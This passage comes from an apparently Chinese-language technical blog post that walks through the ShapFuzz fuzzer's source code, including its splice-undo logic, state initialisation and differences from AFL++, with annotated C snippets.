len);<br>  <span class="hljs-comment">// 给afl-&gt;out_test分配内存，指针*u8_mem也指向这块内存，并将当前测试实例copy给u8_mem</span><br>      u8 *u8_mem = afl_realloc(AFL_BUF_PARAM(out_test), init_len);<br>      <span class="hljs-keyword">if</span> (unlikely(!u8_mem)) &#123; PFATAL(<span class="hljs-string">&quot;alloc&quot;</span>); &#125;<br>      u32 len_test = init_len;<br>      <span class="hljs-built_in">memcpy</span>(u8_mem, (u8*)mem, init_len);<br>  <span class="hljs-comment">// i == 拼接次数 - 1</span><br>      <span class="hljs-type">int</span> i = afl-&gt;splice_num - <span class="hljs-number">1</span>;<br>      <span class="hljs-comment">// 当存在拼接变异，根据拼接栈，进行复原。也就是将更改种子长度的变异操作给撤销。</span><br>      <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span>)<br>      &#123;<br>          <br>        u32 type = afl-&gt;splice_stack[i][<span class="hljs-number">0</span>];<br>        u32 start = afl-&gt;splice_stack[i][<span class="hljs-number">1</span>];<br>        u32 mutation_length = afl-&gt;splice_stack[i][<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(type == <span class="hljs-number">1</span>)&#123; <br>          u32 del_from = start;<br>          u32 del_len = mutation_length;<br>          memmove(u8_mem + del_from, u8_mem + del_from + del_len,<br>                  len_test - del_from - del_len);<br><br>          len_test -= del_len;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          u32 clone_to = start;<br>          u32 clone_len = mutation_length;<br>          u8* clone_from = (u8*)(&amp;(afl-&gt;splice_stack[i][<span class="hljs-number">3</span>]));<br>          u8 *new_buf =<br>              afl_realloc(AFL_BUF_PARAM(out_scratch), len_test + clone_len);<br>          <span class="hljs-keyword">if</span> (unlikely(!new_buf)) &#123; PFATAL(<span class="hljs-string">&quot;alloc&quot;</span>); &#125;<br>          <span class="hljs-built_in">memcpy</span>(new_buf, u8_mem, clone_to);<br>          <span class="hljs-built_in">memcpy</span>(new_buf + clone_to, clone_from, clone_len);<br>          <span class="hljs-built_in">memcpy</span>(new_buf + clone_to + clone_len, u8_mem + clone_to,<br>                  len_test - clone_to);<br><br>          u8_mem = new_buf;<br>          afl_swap_bufs(AFL_BUF_PARAM(out_test), AFL_BUF_PARAM(out_scratch));<br>          len_test += clone_len;<br>        &#125;<br><br>        i--;<br>      &#125;<br><span class="hljs-comment">// 经过撤销后，现在种子的长度与初始种子的长度一致，处于同一个family中。</span><br>      u8 new_fault;<br>    <span class="hljs-comment">// 再将这个撤销操作后的测试实例执行</span><br>      len_test = write_to_testcase(afl, u8_mem, len_test, <span class="hljs-number">0</span>);<br>      new_fault = fuzz_run_target(afl, &amp;afl-&gt;fsrv, afl-&gt;hang_tmout);<br>        <span class="hljs-comment">// 判断是否发现新路径</span><br>      classify_counts(&amp;afl-&gt;fsrv);<br><br>      u8 unchanged = <span class="hljs-number">1</span>;<br>    <br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;new_edges_found_idx;i++)&#123;<br>        u32 cur_edge = afl-&gt;new_edges_found[i];<br>          <span class="hljs-comment">// 检查所有发现的新边，对于撤销长度变异后的执行结果，只要有没发现上次发现的边，则置0</span><br>        <span class="hljs-keyword">if</span>(!(afl-&gt;fsrv.trace_bits)[cur_edge]) unchanged = <span class="hljs-number">0</span>;<br>      &#125;<br><span class="hljs-comment">// unchanged为1，说明撤销长度变异，不改变覆盖结果</span><br>    <span class="hljs-comment">// 那么将保存撤销长度变异后的测试实例</span><br>      <span class="hljs-keyword">if</span>(unchanged &amp;&amp; len_test == afl-&gt;queue_cur-&gt;len)&#123;<br>        afl-&gt;use_splice_mutator = <span class="hljs-number">0</span>;<br>        <br>        u8 *new_buf = afl_realloc(AFL_BUF_PARAM(out), len_test);<br>        <span class="hljs-keyword">if</span> (unlikely(!new_buf)) &#123; PFATAL(<span class="hljs-string">&quot;alloc&quot;</span>); &#125;<br>        <span class="hljs-built_in">memcpy</span>(new_buf, u8_mem, len_test);<br>        len = len_test;<br>        mem = new_buf;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>          <span class="hljs-comment">// 说明撤销长度变异无法到达之前的结果</span><br>          <span class="hljs-comment">// 将撤销长度变异前，也就是当前测试实例保存于mem中</span><br>        u8 *new_buf = afl_realloc(AFL_BUF_PARAM(out), init_len);<br>        <span class="hljs-keyword">if</span> (unlikely(!new_buf)) &#123; PFATAL(<span class="hljs-string">&quot;alloc&quot;</span>); &#125;<br>        len = init_len;<br>        <span class="hljs-built_in">memcpy</span>(new_buf, init, init_len);<br>        mem = new_buf;<br><span class="hljs-comment">// 将reset置1</span><br>        u8 reset = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;new_edges_found_idx;i++)&#123;<br>          u32 cur_edge = afl-&gt;new_edges_found[i];<br>            <span class="hljs-comment">// 遍历所有新发现的边，如果这条自新边重置次数大于8次，那么不再重置</span><br>          <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;ancestor_seed-&gt;reset_times[cur_edge] &gt; <span class="hljs-number">8</span>) reset = <span class="hljs-number">0</span>;<br>        &#125;<br><span class="hljs-comment">// 重置操作</span><br>        <span class="hljs-keyword">if</span>(reset)&#123;<br>          u8 new_fault;<br>            <span class="hljs-comment">// 将测试实例写入共享内存</span><br>          len = write_to_testcase(afl, mem, len, <span class="hljs-number">0</span>);<br>            <span class="hljs-comment">// 运行目标程序</span><br>          new_fault = fuzz_run_target(afl, &amp;afl-&gt;fsrv, afl-&gt;hang_tmout);<br>          classify_counts(&amp;afl-&gt;fsrv);<br>            <span class="hljs-comment">// 当前队列不为空 并且 当前测试实例存在原始种子 并且 afl-&gt;from_splicing为0</span><br>          <span class="hljs-keyword">if</span>(afl-&gt;queue_cur &amp;&amp; !(afl-&gt;queue_cur-&gt;ancestor_seed == <span class="hljs-literal">NULL</span> || afl-&gt;from_splicing))&#123;<br>              <span class="hljs-comment">// 则获取原始种子的virgin_bits，再遍历所有自新边</span><br>            u8* virgin_local = (u8 *)afl-&gt;queue_cur-&gt;ancestor_seed-&gt;virgin_bits;<br>            <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;new_edges_found_idx;i++)&#123;<br>                <span class="hljs-comment">// 将所有自新边的重置次数+1</span><br>              u32 cur_edge = afl-&gt;new_edges_found[i];<br>              afl-&gt;queue_cur-&gt;ancestor_seed-&gt;reset_times[cur_edge]++;<br>                <span class="hljs-comment">// 这个数组与位图每一字节进行“或”的操作</span><br>              virgin_local[cur_edge] |= (afl-&gt;fsrv.trace_bits)[cur_edge];<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>随后在打印一些数据后，执行open函数打开一个文件句柄,执行<code>ck_write(fd, mem, len, queue_fn);</code>将测试实例给保存起来。随后有两个if，分别是new_bits&#x3D;&#x3D;2的情况，以及AFLFast调度下，更新n_fuzz的queue_entry。随后计算一个<code>afl-&gt;queue_top-&gt;exec_cksum</code>哈希值。然后调用函数<code>calibrate_case</code>，该函数通过多次运行测试用例，检测其稳定性和变量行为，并更新相关的统计信息和状态。随后是执行<code>queue_testcase_store_mem()</code>函数，将当前队列顶部的测试实例加入到缓存中。</p><p>接下来就是对传入的fault进行判断，也就是本函数接收的，上一层经过执行的结果。对结果进行判断。根据fault的结果进入不同的分支：</p><ul><li><code>FAULT_TMOUT</code><ul><li>设置total_tmouts计数器加一。如果unique_hangs的个数超过能保存的最大数量<code>KEEP_UNIQUE_HANG</code>，就直接返回keeping的值，如果不是dumb mode，就<code>simplify_trace((u64 *) trace_bits)</code>进行规整。如果没有发现新的超时路径，就直接返回keeping，否则，代表发现了新的超时路径，unique_tmouts计数器加一</li><li>如果hang_tmout大于exec_tmout，则以hang_tmout为timeout，重新执行一次runt_targe<ul><li>如果结果不是<code>FAULT_TMOUT</code>，就返回keeping，否则就使<code>unique_hangs</code>计数器加一，然后更新last_hang_time的值，并保存到<code>alloc_printf(&quot;%s/hangs/id:%06llu,%s&quot;, out_dir, unique_hangs, describe_op(0))</code>文件。</li><li>如果结果为<code>FAULT_CRASH</code>，就跳转到keep_as_crash</li></ul></li></ul></li><li><code>FAULT_CRASH</code></li><li><code>FAULT_ERROR</code></li><li>其他情况，直接返回keeping，也就是1。</li></ul><p>至此，<code>save_if_interesting</code>函数结束，回到<code>common_fuzz_stuff</code>函数处执行。调用<code>show_stats(afl)</code>函数。该函数刷新screen；至此，common_fuzz_stuff执行完成。</p><p>执行完成后，执行<code>stat_analysis</code>函数，该函数主要做的工作是，计算reward，也就是收益R。根据发现的自新边，统计必要字节数量，最后计算字节Shapley值。</p><p>执行<code>stat_analysis()</code>后，恢复out_buf的初始状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-built_in">memset</span>(afl, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">afl_state_t</span>));<br><br>  afl-&gt;shm.map_size = map_size ? map_size : MAP_SIZE;<br><br>  afl-&gt;w_init = <span class="hljs-number">0.9</span>;<br>  afl-&gt;w_end = <span class="hljs-number">0.3</span>;<br>  afl-&gt;g_max = <span class="hljs-number">5000</span>;<br>  afl-&gt;period_pilot_tmp = <span class="hljs-number">5000.0</span>;<br>  afl-&gt;schedule = FAST;                 <span class="hljs-comment">/* Power schedule (default: FAST)   */</span><br>  afl-&gt;havoc_max_mult = HAVOC_MAX_MULT;<br><br>  afl-&gt;clear_screen = <span class="hljs-number">1</span>;                <span class="hljs-comment">/* Window resized?                  */</span><br>  afl-&gt;havoc_div = <span class="hljs-number">1</span>;                   <span class="hljs-comment">/* Cycle count divisor for havoc    */</span><br>  afl-&gt;stage_name = <span class="hljs-string">&quot;init&quot;</span>;             <span class="hljs-comment">/* Name of the current fuzz stage   */</span><br>  afl-&gt;splicing_with = <span class="hljs-number">-1</span>;              <span class="hljs-comment">/* Splicing with which test case?   */</span><br>  afl-&gt;cpu_to_bind = <span class="hljs-number">-1</span>;<br>  afl-&gt;havoc_stack_pow2 = HAVOC_STACK_POW2;<br>  afl-&gt;hang_tmout = EXEC_TIMEOUT;<br>  afl-&gt;exit_on_time = <span class="hljs-number">0</span>;<br>  afl-&gt;stats_update_freq = <span class="hljs-number">1</span>;<br>  afl-&gt;stats_avg_exec = <span class="hljs-number">0</span>;<br>  afl-&gt;skip_deterministic = <span class="hljs-number">1</span>;<br>  afl-&gt;cmplog_lvl = <span class="hljs-number">2</span>;<br>  afl-&gt;min_length = <span class="hljs-number">1</span>;<br>  afl-&gt;max_length = MAX_FILE;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> NO_SPLICING</span><br>  afl-&gt;use_splicing = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  afl-&gt;q_testcase_max_cache_size = TESTCASE_CACHE_SIZE * <span class="hljs-number">1048576UL</span>;<br>  afl-&gt;q_testcase_max_cache_entries = <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> HAVE_AFFINITY</span><br>  afl-&gt;cpu_aff = <span class="hljs-number">-1</span>;                    <span class="hljs-comment">/* Selected CPU core                */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>                                                     <span class="hljs-comment">/* HAVE_AFFINITY */</span></span><br><br>  afl-&gt;virgin_bits = ck_alloc(map_size);<br>  afl-&gt;virgin_tmout = ck_alloc(map_size);<br>  afl-&gt;virgin_crash = ck_alloc(map_size);<br>  afl-&gt;var_bytes = ck_alloc(map_size);<br>  afl-&gt;top_rated = ck_alloc(map_size * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span> *));<br>  afl-&gt;clean_trace = ck_alloc(map_size);<br>  afl-&gt;clean_trace_custom = ck_alloc(map_size);<br>  afl-&gt;first_trace = ck_alloc(map_size);<br>  afl-&gt;map_tmp_buf = ck_alloc(map_size);<br><br>  afl-&gt;fsrv.use_stdin = <span class="hljs-number">1</span>;<br>  afl-&gt;fsrv.map_size = map_size;<br>  <span class="hljs-comment">// afl_state_t is not available in forkserver.c</span><br>  afl-&gt;fsrv.afl_ptr = (<span class="hljs-type">void</span> *)afl;<br>  afl-&gt;fsrv.add_extra_func = (<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span> *, u8 *, u32)) &amp; add_extra;<br>  afl-&gt;fsrv.exec_tmout = EXEC_TIMEOUT;<br>  afl-&gt;fsrv.mem_limit = MEM_LIMIT;<br>  afl-&gt;fsrv.dev_urandom_fd = <span class="hljs-number">-1</span>;<br>  afl-&gt;fsrv.dev_null_fd = <span class="hljs-number">-1</span>;<br>  afl-&gt;fsrv.child_pid = <span class="hljs-number">-1</span>;<br>  afl-&gt;fsrv.out_dir_fd = <span class="hljs-number">-1</span>;<br><br>  init_mopt_globals(afl);<br><br>  list_append(&amp;afl_states, afl);<br><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __linux__</span><br>  fsrv-&gt;nyx_handlers = <span class="hljs-literal">NULL</span>;<br>  fsrv-&gt;out_dir_path = <span class="hljs-literal">NULL</span>;<br>  fsrv-&gt;nyx_mode = <span class="hljs-number">0</span>;<br>  fsrv-&gt;nyx_parent = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;nyx_standalone = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;nyx_runner = <span class="hljs-literal">NULL</span>;<br>  fsrv-&gt;nyx_id = <span class="hljs-number">0xFFFFFFFF</span>;<br>  fsrv-&gt;nyx_bind_cpu_id = <span class="hljs-number">0xFFFFFFFF</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-comment">// this structure needs default so we initialize it if this was not done</span><br>  <span class="hljs-comment">// already</span><br>  fsrv-&gt;out_fd = <span class="hljs-number">-1</span>;<br>  fsrv-&gt;out_dir_fd = <span class="hljs-number">-1</span>;<br>  fsrv-&gt;dev_null_fd = <span class="hljs-number">-1</span>;<br>  fsrv-&gt;dev_urandom_fd = <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-comment">/* Settings */</span><br>  fsrv-&gt;use_stdin = <span class="hljs-literal">true</span>;<br>  fsrv-&gt;no_unlink = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;exec_tmout = EXEC_TIMEOUT;<br>  fsrv-&gt;init_tmout = EXEC_TIMEOUT * FORK_WAIT_MULT;<br>  fsrv-&gt;mem_limit = MEM_LIMIT;<br>  fsrv-&gt;out_file = <span class="hljs-literal">NULL</span>;<br>  fsrv-&gt;kill_signal = SIGKILL;<br><br>  <span class="hljs-comment">/* exec related stuff */</span><br>  fsrv-&gt;child_pid = <span class="hljs-number">-1</span>;<br>  fsrv-&gt;map_size = get_map_size();<br>  fsrv-&gt;real_map_size = fsrv-&gt;map_size;<br>  fsrv-&gt;use_fauxsrv = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;last_run_timed_out = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;debug = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;uses_crash_exitcode = <span class="hljs-literal">false</span>;<br>  fsrv-&gt;uses_asan = <span class="hljs-literal">false</span>;<br><br>  fsrv-&gt;init_child_func = fsrv_exec_child;<br>  list_append(&amp;fsrv_list, fsrv);<br><br></code></pre></td></tr></table></figure><h2 id="difference-between-Shapfuzz-and-AFLpp"><a href="#difference-between-Shapfuzz-and-AFLpp" class="headerlink" title="difference between Shapfuzz and AFLpp"></a>difference between Shapfuzz and AFLpp</h2><h3 id="afl-state-init"><a href="#afl-state-init" class="headerlink" title="afl_state_init()"></a>afl_state_init()</h3><p>来到初始化afl_state_t数据结构，也就是调用函数afl_state_init()，有shapfuzz以下成员变量被额外初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"> afl-&gt;new_edges_found_idx = <span class="hljs-number">0</span>;<br> afl-&gt;read_flag = <span class="hljs-number">1</span>;<br> afl-&gt;write_flag = <span class="hljs-number">0</span>;<br> afl-&gt;mini_mode = <span class="hljs-number">0</span>;<br> afl-&gt;time_to_use_length_mutator = <span class="hljs-number">0</span>;<br><br> afl-&gt;cur_mutation_sequence_idx = <span class="hljs-number">0</span>;<br> afl-&gt;cmp_states = ck_alloc(<span class="hljs-number">65536</span>);<br> <span class="hljs-built_in">memset</span>(afl-&gt;cmp_states, <span class="hljs-number">0</span>, <span class="hljs-number">65536</span>);<br><br> afl-&gt;exec_history_all = <span class="hljs-number">0</span>;<br> afl-&gt;found_by_history_all = <span class="hljs-number">0</span>;<br> afl-&gt;exec_new_all = <span class="hljs-number">0</span>;<br> afl-&gt;found_by_new_all = <span class="hljs-number">0</span>;<br> afl-&gt;exec_random_all = <span class="hljs-number">0</span>;<br> afl-&gt;found_by_random_all = <span class="hljs-number">0</span>;<br> afl-&gt;exec_all = <span class="hljs-number">0</span>;<br> afl-&gt;found_all = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 中心节点的数量</span><br> afl-&gt;centers_num = <span class="hljs-number">20</span>;<br><span class="hljs-comment">// 存储着各个中心节点</span><br> afl-&gt;centers = ck_alloc(afl-&gt;centers_num * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span> *));<br> <span class="hljs-built_in">memset</span>(afl-&gt;centers, <span class="hljs-number">0</span>, afl-&gt;centers_num * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span> *));<br><br> afl-&gt;exist_centers = <span class="hljs-number">0</span>;<br> afl-&gt;centers_gen_time = <span class="hljs-number">0</span>;<br> afl-&gt;last_centers_realted_seeds = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 特征图</span><br> afl-&gt;feature_map = ck_alloc(map_size * <span class="hljs-keyword">sizeof</span>(u32));<br><span class="hljs-comment">// 置0</span><br> <span class="hljs-built_in">memset</span>(afl-&gt;feature_map, <span class="hljs-number">0</span>, map_size * <span class="hljs-keyword">sizeof</span>(u32));<br> afl-&gt;num_edge = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 收益R</span><br> afl-&gt;dataset_reward = <span class="hljs-literal">NULL</span>;<br> afl-&gt;hit_nums = <span class="hljs-literal">NULL</span>;<br> afl-&gt;tmp_mutated_pos = <span class="hljs-literal">NULL</span>;<br> afl-&gt;tmp_mutated_pos_flag = <span class="hljs-literal">NULL</span>;<br> afl-&gt;tmp_mutated_pos_idx = <span class="hljs-number">0</span>;<br> afl-&gt;cur_n_fuzz_idx = <span class="hljs-number">0</span>;<br> afl-&gt;dataset_size = <span class="hljs-number">0</span>;<br> afl-&gt;record_flag = <span class="hljs-number">0</span>;<br> afl-&gt;last_show_time = <span class="hljs-number">0</span>;<br><br> afl-&gt;history_mutation_sequence = <span class="hljs-literal">NULL</span>;<br> afl-&gt;history_mutation_sequence_idx = <span class="hljs-number">0</span>;<br> afl-&gt;new_mutation_sequence = <span class="hljs-literal">NULL</span>;<br> afl-&gt;new_mutation_sequence_idx = <span class="hljs-number">0</span>;<br> afl-&gt;max_len = <span class="hljs-number">0</span>;<br><br> afl-&gt;before = <span class="hljs-number">0</span>;<br><br> afl-&gt;family_record_time = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h3 id="afl-fsrv-init"><a href="#afl-fsrv-init" class="headerlink" title="afl_fsrv_init"></a>afl_fsrv_init</h3><p>初始化afl-&gt;fsrv的成员变量</p><h3 id="read-afl-environment"><a href="#read-afl-environment" class="headerlink" title="read_afl_environment()"></a>read_afl_environment()</h3><p>将原本aflpp中的AFL_PIZZA_MODE删除。删除部分如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(env, <span class="hljs-string">&quot;AFL_PIZZA_MODE&quot;</span>, afl_environment_variable_len)) &#123;<br>    afl-&gt;afl_env.afl_pizza_mode =atoi((u8 *)get_afl_env(afl_environment_variables[i]));<br>    <span class="hljs-keyword">if</span> (afl-&gt;afl_env.afl_pizza_mode == <span class="hljs-number">0</span>) &#123;<br>        afl-&gt;afl_env.afl_pizza_mode = <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        afl-&gt;pizza_is_served = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="循环获取命令行参数"><a href="#循环获取命令行参数" class="headerlink" title="循环获取命令行参数"></a>循环获取命令行参数</h3><p>Shapfuzz多了两个个参数，分别为:<code>-w,-k</code>，它们分别做的操作有：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>afl-&gt;history_mode = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>:<br>afl-&gt;new_mode = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><h3 id="各种模式的初始化操作"><a href="#各种模式的初始化操作" class="headerlink" title="各种模式的初始化操作"></a>各种模式的初始化操作</h3><p><code>afl-&gt;power_name = power_names[afl-&gt;schedule]; </code>这里被赋值成了<code>fast</code>，是因为初始化afl-&gt;schedule被赋值成了3；默认是fast模式。以及，以下两个成员变量被赋值。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">afl-&gt;sync_id <span class="hljs-operator">=</span> ck_strdup(<span class="hljs-string">&quot;default&quot;</span>)<span class="hljs-comment">;</span><br>afl-&gt;is_secondary_node <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((afl-&gt;schedule &gt;= FAST &amp;&amp; afl-&gt;schedule &lt;= RARE) || afl-&gt;history_mode) &#123;<br><br>  afl-&gt;n_fuzz = ck_alloc(N_FUZZ_SIZE * <span class="hljs-keyword">sizeof</span>(u32));<br><br>&#125;<br></code></pre></td></tr></table></figure><p>启用history模式或者符合条件的模式，会给afl-&gt;n_fuzz分配空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;max_det_extras = MAX_DET_EXTRAS; <span class="hljs-comment">// 这个常量值为256</span><br></code></pre></td></tr></table></figure><p>再初始化测试的cache：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!afl-&gt;afl_env.afl_testcache_size || !afl-&gt;afl_env.afl_testcache_entries) &#123;<br>    afl-&gt;afl_env.afl_testcache_entries = <span class="hljs-number">0</span>;<br>    afl-&gt;afl_env.afl_testcache_size = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>初始化forkserver超时时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.init_tmout = afl-&gt;fsrv.exec_tmout * FORK_WAIT_MULT; <span class="hljs-comment">// 初始化做过一次，重复执行了。</span><br></code></pre></td></tr></table></figure><p>为buf分配空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">afl_realloc(AFL_BUF_PARAM(in_scratch), min_alloc); <span class="hljs-comment">// in_scratch_buf</span><br>afl_realloc(AFL_BUF_PARAM(in), min_alloc);<span class="hljs-comment">// in_buf</span><br>afl_realloc(AFL_BUF_PARAM(out_scratch), min_alloc);<span class="hljs-comment">// out_scratch_buf</span><br>afl_realloc(AFL_BUF_PARAM(out), min_alloc);<span class="hljs-comment">// out_buf</span><br>afl_realloc(AFL_BUF_PARAM(eff), min_alloc);<span class="hljs-comment">// eff_buf</span><br>afl_realloc(AFL_BUF_PARAM(ex), min_alloc);<span class="hljs-comment">// ex_buf</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.use_fauxsrv = afl-&gt;non_instrumented_mode == <span class="hljs-number">1</span> || afl-&gt;no_forkserver;<span class="hljs-comment">//给use_fauxsrv赋值为 afl-&gt;no_forkserver</span><br></code></pre></td></tr></table></figure><h3 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds()"></a>setup_dirs_fds()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.out_dir_fd = open(afl-&gt;out_dir, O_RDONLY);<br>afl-&gt;fsrv.plot_file = fdopen(fd, <span class="hljs-string">&quot;w&quot;</span>);<br>afl-&gt;fsrv.dev_null_fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR);<br>afl-&gt;fsrv.dev_urandom_fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, O_RDONLY);<br></code></pre></td></tr></table></figure><h3 id="read-testcases"><a href="#read-testcases" 